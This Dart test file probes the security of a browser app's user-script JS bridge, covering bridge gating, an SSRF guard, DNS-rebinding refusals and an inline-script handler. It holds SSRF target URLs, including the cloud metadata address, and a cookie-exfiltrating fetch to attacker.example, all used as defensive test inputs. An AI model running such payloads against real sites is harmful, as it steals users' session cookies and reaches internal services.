// Authorization probes for the page-reachable JS bridge that
// UserScriptService installs.
//
// user_script_handlers_test.dart covers the handlers' functional
// contract. This file asks the adversarial question instead: the shim
// publishes `window.__wsFetch` and wraps DOM globals, so *any* script running
// on a page that has the bridge can drive these handlers — the site's own JS,
// a third-party ad script, or an XSS payload. That is not fixable from inside
// the page realm, which is why the bridge is installed only where a user
// script explicitly asked for it (US-DR-005, first group below). These tests
// pin both halves: when the bridge exists at all, and what a caller reaches
// once it does.
//
// Sibling: test/browser/bridge_privilege_escalation.test.js proves the
// reachability half under a real engine.

import 'package:flutter_test/flutter_test.dart';
import 'package:http/http.dart' as http;

import 'package:webspace/services/host_resolution.dart';
import 'package:webspace/services/outbound_http.dart';
import 'package:webspace/services/user_script_service.dart';
import 'package:webspace/settings/proxy.dart';
import 'package:webspace/settings/user_script.dart';

import 'helpers/user_script_bridge_fakes.dart';

void main() {
  setUp(stubHostLookup);
  tearDown(resetHostLookup);

  group('the bridge is not installed unless a script asked for it', () {
    // Enabling a user script says "run my code". It does not say "stop
    // enforcing this site's CSP and same-origin policy for everything on the
    // page", which is what installing the bridge unavoidably does.
    test('an ordinary user script gets no handlers', () async {
      final ctrl = FakeUserScriptController();
      final svc = serviceWith(plainScript);

      svc.registerHandlers(ctrl);

      expect(svc.hasScripts, isTrue, reason: 'the script still runs');
      expect(svc.hasPrivilegedBridge, isFalse);
      expect(ctrl.handlers, isEmpty);
      expect(
        svc.shimScript,
        isNull,
        reason: 'no shim means no __wsFetch and no DOM wrappers either',
      );
    });

    test('one script asking for it arms the bridge for the site', () async {
      final ctrl = FakeUserScriptController();
      final svc = serviceWith([
        UserScriptConfig(name: 'plain', source: 'noop;'),
        UserScriptConfig(
          name: 'darkreader',
          source: 'noop;',
          bypassSitePolicy: true,
        ),
      ]);

      svc.registerHandlers(ctrl);

      expect(svc.hasPrivilegedBridge, isTrue);
      expect(ctrl.handlers, isNotEmpty);
    });

    test('a disabled script cannot arm it', () async {
      final ctrl = FakeUserScriptController();
      final svc = serviceWith([
        UserScriptConfig(
          name: 'off',
          source: 'noop;',
          enabled: false,
          bypassSitePolicy: true,
        ),
      ]);

      svc.registerHandlers(ctrl);

      expect(svc.hasPrivilegedBridge, isFalse);
      expect(ctrl.handlers, isEmpty);
    });
  });

  group('confirmation gate asymmetry', () {
    // The script handler treats requiresConfirmation as "ask the user".
    // The resource-fetch handler only checks for `blocked` and fetches
    // everything else, so the confirmation prompt does not apply to it.
    test(
      '__wsFetch reaches a non-whitelisted host with no user prompt',
      () async {
        final factory = FakeOutboundFactory(
          (_) => http.Response('SECRET', 200),
        );
        outboundHttp = factory;
        final asked = <String>[];
        final ctrl = FakeUserScriptController();
        serviceWith(
          oneScript,
          confirm: (url) async {
            asked.add(url);
            return false;
          },
        ).registerHandlers(ctrl);

        final res = await ctrl.handler(kFetchHandlerPrefix)([
          'https://not-whitelisted.example/x',
        ]);

        expect((res as Map)['status'], 200);
        expect(res['body'], 'SECRET');
        expect(asked, isEmpty);
        expect(factory.requested.single.host, 'not-whitelisted.example');
      },
    );

    test('the script handler gates the same URL behind confirmation', () async {
      final factory = FakeOutboundFactory((_) => http.Response('CODE;', 200));
      outboundHttp = factory;
      final asked = <String>[];
      final ctrl = FakeUserScriptController();
      serviceWith(
        oneScript,
        confirm: (url) async {
          asked.add(url);
          return false;
        },
      ).registerHandlers(ctrl);

      final ok = await ctrl.handler(kScriptHandlerPrefix)([
        'https://not-whitelisted.example/x',
      ]);

      expect(ok, isFalse);
      expect(asked, ['https://not-whitelisted.example/x']);
      expect(factory.requested, isEmpty);
    });
  });

  group('SSRF guard on the page-reachable fetch handler', () {
    const hostile = [
      'http://localhost/admin',
      'http://127.0.0.1:8080/',
      'http://10.0.0.1/',
      'http://192.168.1.1/',
      'http://172.16.0.1/',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]/',
      'http://[fe80::1]/',
      'http://[fd00::1]/',
    ];

    for (final url in hostile) {
      test('refuses $url with 403 and issues no request', () async {
        final factory = FakeOutboundFactory((_) => http.Response('x', 200));
        outboundHttp = factory;
        final ctrl = FakeUserScriptController();
        serviceWith(oneScript).registerHandlers(ctrl);

        final res = await ctrl.handler(kFetchHandlerPrefix)([url]);

        expect((res as Map)['status'], 403, reason: url);
        expect(factory.requested, isEmpty, reason: url);
      });
    }

    // The literal check reads the URL string, so a name is whatever it looks
    // like: `localtest.me` reads as an ordinary host and its A record is
    // 127.0.0.1. This used to walk straight through and hand the page
    // whatever the device was serving on loopback. It is now resolved before
    // the connection, and the answer goes through the same ranges.
    test('a hostname that resolves onto loopback is refused', () async {
      stubHostLookup({'localtest.me': const ['127.0.0.1']});
      final factory = FakeOutboundFactory((_) => http.Response('x', 200));
      outboundHttp = factory;
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);

      expect(
        classifyScriptFetchUrl('http://localtest.me/admin'),
        ScriptFetchUrlStatus.requiresConfirmation,
        reason: 'the literal half cannot see it — that is the point',
      );

      final res = await ctrl.handler(kFetchHandlerPrefix)([
        'http://localtest.me/admin',
      ]);

      expect((res as Map)['status'], 403);
      expect(factory.requested, isEmpty);
    });

    test('a hostname resolving into the LAN is refused', () async {
      stubHostLookup({'nas.example': const ['192.168.1.10']});
      final factory = FakeOutboundFactory((_) => http.Response('x', 200));
      outboundHttp = factory;
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);

      final res = await ctrl.handler(kFetchHandlerPrefix)([
        'http://nas.example/config',
      ]);

      expect((res as Map)['status'], 403);
      expect(factory.requested, isEmpty);
    });

    // A name is refused if ANY of its addresses is in range: a record set
    // that pairs a public address with a private one is the same attack with
    // a decoy in front of it.
    test('one private address among public ones is enough to refuse',
        () async {
      stubHostLookup({
        'mixed.example': const ['93.184.216.34', '10.1.2.3'],
      });
      final factory = FakeOutboundFactory((_) => http.Response('x', 200));
      outboundHttp = factory;
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);

      final res = await ctrl.handler(kFetchHandlerPrefix)([
        'http://mixed.example/x',
      ]);

      expect((res as Map)['status'], 403);
      expect(factory.requested, isEmpty);
    });

    test('a redirect onto a name that resolves onto loopback is refused',
        () async {
      stubHostLookup({'localtest.me': const ['127.0.0.1']});
      final factory = FakeOutboundFactory(
        (req) => req.url.host == 'cdn.example'
            ? http.Response('', 302,
                headers: {'location': 'http://localtest.me/admin'})
            : http.Response('SECRET', 200),
      );
      outboundHttp = factory;
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);

      final res = await ctrl.handler(kFetchHandlerPrefix)([
        'http://cdn.example/lib.js',
      ]);

      expect((res as Map)['status'], 403);
      expect(factory.requested.map((u) => u.host), ['cdn.example'],
          reason: 'the hop is judged before it is followed');
    });

    // The script handler prompts for a non-whitelisted host. A name pointing
    // at loopback must never reach that prompt: the dialog shows a URL, and
    // `http://cdn.evil.example/lib.js` reads as a CDN whatever it resolves to.
    test('a rebinding host is refused before the confirmation prompt',
        () async {
      stubHostLookup({'cdn.evil.example': const ['127.0.0.1']});
      final factory = FakeOutboundFactory((_) => http.Response('x', 200));
      outboundHttp = factory;
      final ctrl = FakeUserScriptController();
      var prompted = false;
      serviceWith(oneScript, confirm: (_) async {
        prompted = true;
        return true;
      }).registerHandlers(ctrl);

      final ok = await ctrl.handler(kScriptHandlerPrefix)([
        'http://cdn.evil.example/lib.js',
      ]);

      expect(ok, false);
      expect(prompted, isFalse);
      expect(factory.requested, isEmpty);
    });

    // Under SOCKS5 or Tor the destination name travels to the proxy and is
    // resolved there, so what this device's resolver says describes a network
    // the request never touches. Checking it anyway would refuse a host on
    // the strength of an answer that does not apply — and a Tor user has no
    // local resolver to ask.
    test('the resolve check does not apply under a remote-DNS proxy',
        () async {
      stubHostLookup({'onion-gw.example': const ['127.0.0.1']});
      final factory = FakeOutboundFactory((_) => http.Response('x', 200));
      outboundHttp = factory;
      final ctrl = FakeUserScriptController();
      UserScriptService(
        scripts: oneScript,
        proxy: UserProxySettings(
          type: ProxyType.SOCKS5,
          address: '127.0.0.1:9050',
        ),
      ).registerHandlers(ctrl);

      final res = await ctrl.handler(kFetchHandlerPrefix)([
        'http://onion-gw.example/x',
      ]);

      expect((res as Map)['status'], 200);
    });
  });

  group('inline-script bridge', () {
    // The inline handler exists to run scripts the page's CSP would
    // refuse. It applies no origin, whitelist, or provenance check to
    // the source it is handed, so whoever can reach the bridge gets
    // CSP-exempt execution.
    test('evaluates whatever source the caller supplies', () async {
      outboundHttp = FakeOutboundFactory((_) => http.Response('x', 200));
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);

      await ctrl.handler(kInlineHandlerPrefix)([
        'fetch("https://attacker.example/?c="+document.cookie)',
      ]);

      expect(ctrl.evaluatedAny('attacker.example'), isTrue);
    });

    test(
      'handlers are absent entirely when the site has no user scripts',
      () async {
        final ctrl = FakeUserScriptController();
        serviceWith([]).registerHandlers(ctrl);

        expect(ctrl.handlers, isEmpty);
      },
    );

    test('a disabled script leaves the bridge uninstalled', () async {
      final ctrl = FakeUserScriptController();
      serviceWith([
        UserScriptConfig(
          name: 'off',
          source: 'noop;',
          enabled: false,
          bypassSitePolicy: true,
        ),
      ]).registerHandlers(ctrl);

      expect(ctrl.handlers, isEmpty);
    });
  });

  group('handler naming', () {
    // Handler names are derived from the wall clock, so they are
    // guessable by anyone who can estimate when the webview was built.
    // That is fine only because the names are not the access control:
    // the shim publishes window.__wsFetch as a plain global, so page
    // script never needs to know a handler name. This test pins the
    // derivation so nobody mistakes it for a secret.
    test('names are time-derived, not random', () async {
      final before = DateTime.now().microsecondsSinceEpoch;
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);
      final after = DateTime.now().microsecondsSinceEpoch;

      for (final prefix in [
        kScriptHandlerPrefix,
        kInlineHandlerPrefix,
        kFetchHandlerPrefix,
      ]) {
        final name = ctrl.handlerName(prefix);
        final suffix = name.substring(prefix.length);
        final stamp = int.parse(suffix, radix: 36);
        expect(stamp, inInclusiveRange(before, after), reason: name);
      }
    });
  });
}
